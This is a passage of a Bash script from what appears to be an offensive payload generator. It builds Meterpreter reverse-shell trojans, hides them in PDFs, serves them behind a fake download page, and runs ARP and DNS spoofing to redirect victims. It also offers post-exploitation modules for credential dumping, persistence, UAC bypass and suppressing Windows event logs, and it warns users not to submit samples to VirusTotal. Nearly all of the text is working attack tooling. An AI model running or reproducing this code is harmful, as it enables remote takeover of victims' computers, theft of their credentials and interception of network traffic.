            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi
          fi


        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi
          fi
        fi
   fi


sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1
mv $IPATH/aux/msf/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/msf/enigma_fileless_uac_bypass.rb > /dev/null 2>&1
mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m.zip > /dev/null 2>&1
rm $ApAcHe/$N4m.vbs > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}





# ----------------------------------------------------
# EVIL PDF BUILDER
# ----------------------------------------------------
sh_shellcode15 () {

echo "[☠] EVIL PDF BUILDER -> running..."
echo "[☠] targets: windows xp/vista/7!"
sleep 1
# input PDF output format
oUt=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nevil PDF builder\ncrypting mechanisms available:" --radiolist --column "Pick" --column "Option" TRUE "base64" FALSE "random xor key" --width 300 --height 200) > /dev/null 2>&1


if [ "$oUt" = "base64" ]; then
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ ENTER PDF NAME ☠" --text "Enter pdf output name\nexample: EvilPdf" --width 300) > /dev/null 2>&1
Myd0=$(zenity --title "☠ SELECT PDF FILE TO BE EMBEDDED ☠" --filename=$IPATH --file-selection --text "chose PDF file to use to be serve as template") > /dev/null 2>&1
# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_winhttps" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 370) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="EvilPdf";fi
if [ -z "$Myd0" ]; then echo "${RedF}[x]${white} This Module Requires PDF absoluct path input";sleep 3; sh_exit;fi

echo "[☠] Building shellcode -> psh-cmd format ..."
sleep 2
if [ "$oUt" = "base64" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
echo "[☠] meterpreter over SSL sellected .."
sleep 1
fi

# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    TROJAN  : $N4m.pdf
    FORMAT  : PSH-CMD -> WINDOWS
    PAYLOAD : $paylo

!

# use metasploit to build shellcode
if [ "$oUt" = "base64" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f psh-cmd > $IPATH/output/chars.raw"
else
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f psh-cmd > $IPATH/output/chars.raw"
fi


# display shellcode
str0=`cat $IPATH/output/chars.raw | awk {'print $12'}`
echo ""
echo "[☠] obfuscating -> base64 encoded!"
sleep 2
echo $str0
echo ""
sleep 2

# EDITING/BACKUP FILES NEEDED
echo ""
echo "[☠] editing/backup files..."
sleep 2

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi


echo "[☠] Building template -> template.c!"
sleep 2
# build template file in C language
# reproduction of venom option 6 payload
echo "// C template | Author: r00t-3xp10it" > $IPATH/output/template.c
echo "// execute shellcode powershell base 64 encoded into memory (ram)" >> $IPATH/output/template.c
echo "" >> $IPATH/output/template.c
echo "#include <stdio.h> " >> $IPATH/output/template.c
echo "#include <stdlib.h> " >> $IPATH/output/template.c
echo "" >> $IPATH/output/template.c
echo "int main()" >> $IPATH/output/template.c
echo "{" >> $IPATH/output/template.c
echo ' system("powershell -nop -exec bypass -win Hidden -noni -enc InJ3C"); ' >> $IPATH/output/template.c
echo " return 0; " >> $IPATH/output/template.c
echo "}" >> $IPATH/output/template.c

# injecting shellcode into template using SED+bash variable ( $str0 ) = command substitution
sed -i "s|InJ3C|$str0|" $IPATH/output/template.c


# compile template.c into one stand-alone-executable file using mingw32
# template.c (C code to be compiled) -o (save output name)
echo "[☠] Compiling template.c -> backdoor.exe!"
sleep 2
$ComP $IPATH/output/template.c -o $IPATH/output/backdoor.exe -mwindows
strip --strip-debug $IPATH/output/backdoor.exe



# if you wish to inject your build in another pdf file then change: ( INFILENAME ) switch by the full path to your pdf file
# using msfconsole to embedded the backdoor.exe into one pdf file (remmenber to exit msfconsole: exit -y)
xterm -T " EVIL PDF BUILDER " -geometry 110x23 -e "msfconsole -x 'use windows/fileformat/adobe_pdf_embedded_exe;set EXE::Custom $IPATH/output/backdoor.exe;set FILENAME $N4m.pdf;set INFILENAME $Myd0;exploit;exit -y'" > /dev/null 2>&1


# move files from metasploit to local directory
mv ~/.msf4/local/$N4m.pdf $IPATH/output/$N4m.pdf


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.pdf\n\nchose how to deliver: $N4m.pdf" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 230) > /dev/null 2>&1

   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then

           if [ "$oUt" = "base64" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
           else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
           fi

          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else

           if [ "$oUt" = "base64" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
           else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
           fi
        fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 350) > /dev/null 2>&1

  if [ "$P0" = "persistence.rc" ]; then
  M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.pdf on target every 23 hours" --width 300) > /dev/null 2>&1

    cd $IPATH/aux
    # Build persistence script (AutoRunStart='multi_console_command -r')
    cp persistence.rc persistence[bak].rc
    sed -i "s|N4m|$N4m.pdf|g" persistence.rc
    sed -i "s|IPATH|$IPATH|g" persistence.rc
    sed -i "s|M1P|$M1P|g" persistence.rc

    # Build listenner resource file
    echo "use exploit/multi/handler" > $lhost.rc
    echo "set LHOST $lhost" >> $lhost.rc
    echo "set LPORT $lport" >> $lhost.rc
    echo "set PAYLOAD $paylo" >> $lhost.rc
    echo "exploit" >> $lhost.rc
    mv $lhost.rc $IPATH/output/$lhost.rc
    cd $IPATH

    elif [ "$P0" = "privilege_escalation.rc" ]; then
      cd $IPATH/aux
      # backup files needed
      cp privilege_escalation.rc privilege_escalation[bak].rc
      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb
      # Build resource files needed
      sed -i "s|N4m|$N4m.pdf|g" privilege_escalation.rc
      sed -i "s|IPATH|$IPATH|g" privilege_escalation.rc
      sed -i "s|N4m|$N4m.pdf|g" enigma_fileless_uac_bypass.rb
      # reload metasploit database
      echo "[☠] copy post-module to msf db!"
      cp enigma_fileless_uac_bypass.rb $pHanTom/post/windows/escalate/enigma_fileless_uac_bypass.rb
      echo "[☠] reloading -> Metasploit database!"
      xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
      cd $IPATH


  elif [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi


  else

    echo "do nothing" > /dev/null 2>&1

fi

      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.pdf|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.pdf $ApAcHe/$N4m.pdf > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.pdf|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.pdf $ApAcHe/$N4m.pdf
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

           if [ "$oUt" = "base64" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

           if [ "$oUt" = "base64" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$oUt" = "base64" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

            if [ "$oUt" = "base64" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi
          fi
        fi
   fi




# ---------------------------------------
# chose to build the xor encrypted one :D
# ---------------------------------------
else



# config settings in PDF_encoder.py script
ec=`echo ~`
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ ENTER PDF OUTPUT NAME ☠" --text "Enter pdf output name\nexample: XorPdf" --width 300) > /dev/null 2>&1
echo "[☠] editing/backup files..."
sleep 2
cd $IPATH/templates/evil_pdf
cp PDF_encoder.py PDF_encoder[bak].py
# config pdf_encoder.py
sed -i "s|Sk3lL3T0n|$IPATH/templates/evil_pdf/skelleton.c|" PDF_encoder.py
sed -i "s|EXE::CUSTOM backdoor.exe|EXE::CUSTOM $ec/backdoor.exe|" PDF_encoder.py
sed -i "s|Lh0St|$lhost|" PDF_encoder.py
sed -i "s|lP0Rt|$lport|" PDF_encoder.py


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="XorPdf";fi


# runing evil-pdf-builder python script
xterm -T " EVIL PDF BUILDER " -geometry 110x23 -e "python PDF_encoder.py" > /dev/null 2>&1
# moving files
mv PDF_encoder[bak].py PDF_encoder.py
mv ~/backdoor.exe $IPATH/output/backdoor.exe
mv ~/backdoor.pdf $IPATH/output/$N4m.pdf
echo "[☠] files generated into output folder..."
cd $IPATH


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.pdf\n\nchose how to deliver: $N4m.pdf" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 230) > /dev/null 2>&1

   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
        fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 350) > /dev/null 2>&1

  if [ "$P0" = "persistence.rc" ]; then
  M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.pdf on target every 23 hours" --width 300) > /dev/null 2>&1

    cd $IPATH/aux
    # Build persistence script (AutoRunStart='multi_console_command -r')
    cp persistence.rc persistence[bak].rc
    sed -i "s|N4m|$N4m.pdf|g" persistence.rc
    sed -i "s|IPATH|$IPATH|g" persistence.rc
    sed -i "s|M1P|$M1P|g" persistence.rc

    # Build listenner resource file
    echo "use exploit/multi/handler" > $lhost.rc
    echo "set LHOST $lhost" >> $lhost.rc
    echo "set LPORT $lport" >> $lhost.rc
    echo "set PAYLOAD $paylo" >> $lhost.rc
    echo "exploit" >> $lhost.rc
    mv $lhost.rc $IPATH/output/$lhost.rc
    cd $IPATH

    elif [ "$P0" = "privilege_escalation.rc" ]; then
      cd $IPATH/aux
      # backup files needed
      cp privilege_escalation.rc privilege_escalation[bak].rc
      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb
      # Build resource files needed
      sed -i "s|N4m|$N4m.pdf|g" privilege_escalation.rc
      sed -i "s|IPATH|$IPATH|g" privilege_escalation.rc
      sed -i "s|N4m|$N4m.pdf|g" enigma_fileless_uac_bypass.rb
      # reload metasploit database
      echo "[☠] copy post-module to msf db!"
      cp enigma_fileless_uac_bypass.rb $pHanTom/post/windows/escalate/enigma_fileless_uac_bypass.rb
      echo "[☠] reloading -> Metasploit database!"
      xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
      cd $IPATH


  elif [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi


  else

    echo "do nothing" > /dev/null 2>&1

fi


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.pdf|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.pdf $ApAcHe/$N4m.pdf > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.pdf|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.pdf $ApAcHe/$N4m.pdf
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
